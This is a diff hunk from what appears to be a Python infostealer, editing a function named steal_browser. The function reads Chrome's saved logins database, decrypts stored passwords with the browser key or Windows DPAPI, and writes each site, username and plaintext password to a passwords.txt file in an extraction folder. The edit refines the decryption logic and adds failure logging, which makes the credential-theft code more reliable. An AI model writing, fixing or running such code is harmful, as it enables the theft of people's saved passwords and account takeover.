@@ -204,26 +204,25 @@ def steal_browser():
                     c.execute("SELECT origin_url, username_value, password_value FROM logins")
                     with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for row in c.fetchall():
-                            blob = row[2]
+                            blob = bytes(row[2])  # <-- ALWAYS convert to bytes
+
                             if not blob:
                                 continue
 
-                            # decide how to handle the blob
                             try:
-                                if isinstance(blob, str):  # mock/plaintext you inserted manually
-                                    decrypted_pw = blob
-                                elif blob[:3] in (b'v10', b'v11') or blob.startswith(b'\x01'):  # real encrypted
+                                if blob[:3] in (b'v10', b'v11'):
                                     decrypted_pw = decrypt(blob, key)
                                 else:
-                                    # try DPAPI once, otherwise treat as bytes->string
-                                    try:
-                                        decrypted_pw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", "ignore")
-                                    except Exception:
-                                        decrypted_pw = blob.decode("utf-8", "ignore")
+                                    decrypted_pw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", "ignore")
                             except Exception as e:
                                 decrypted_pw = f"[FAILED: {e}]"
 
+                            # Debug: log failures for troubleshooting
+                            if not decrypted_pw or decrypted_pw.startswith("[FAILED"):
+                                print(f"Failed to decrypt Chrome password for {row[0]} | {row[1]} | BLOB: {blob[:15].hex()}")
+
                             f.write(f"[{name}] {row[0]} | {row[1]} | {decrypted_pw}\n")
+
 
                 except: pass
                 c.connection.close()
